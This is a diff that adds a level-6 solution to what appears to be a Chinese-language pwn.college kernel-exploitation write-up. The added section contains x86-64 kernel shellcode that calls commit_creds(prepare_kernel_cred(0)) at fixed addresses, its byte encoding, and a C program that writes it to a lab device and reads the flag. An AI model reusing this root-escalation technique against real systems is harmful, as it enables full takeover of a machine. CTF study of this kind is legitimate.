@@ -65,3 +65,33 @@ int main() {
     return 0;
 }
 ```
+
+### level6.0
+
+建议阅读`Kernel Security: Writing Kernel Shellcode`后再做这题
+
+在kernel中运行的shellcode没法用syscall，因为调用syscall时系统会认为当前需要切换至内核态，并做一些相应的假设。而这些假设放到kernel里会崩溃。不过还好我们也不需要做太复杂的东西，调用经典的`commit_creds(prepare_kernel_cred(0))`拿到root权限后回到用户态读flag即可
+
+仍然没有kaslr。在`/proc/kallsyms`中找到这两个函数的地址后编写shellcode
+```
+xor rdi,rdi
+mov rax,0xffffffff81089660
+call rax
+mov rdi,rax
+mov rax,0xffffffff81089310
+call rax
+ret
+```
+```c
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdlib.h>
+int main() {
+    int fd = open("/proc/pwncollege", O_RDWR);
+    char shellcode[]="\x48\x31\xFF\x48\xC7\xC0\x60\x96\x08\x81\xFF\xD0\x48\x89\xC7\x48\xC7\xC0\x10\x93\x08\x81\xFF\xD0\xC3";
+    write(fd,shellcode,sizeof(shellcode));
+    system("cat /flag");
+    return 0;
+}
+```
+另外，shellcode末尾的ret是必须的。内核中运行的shellcode不能出现崩溃的情况，不然整个内核直接炸掉，甚至来不及拿到flag
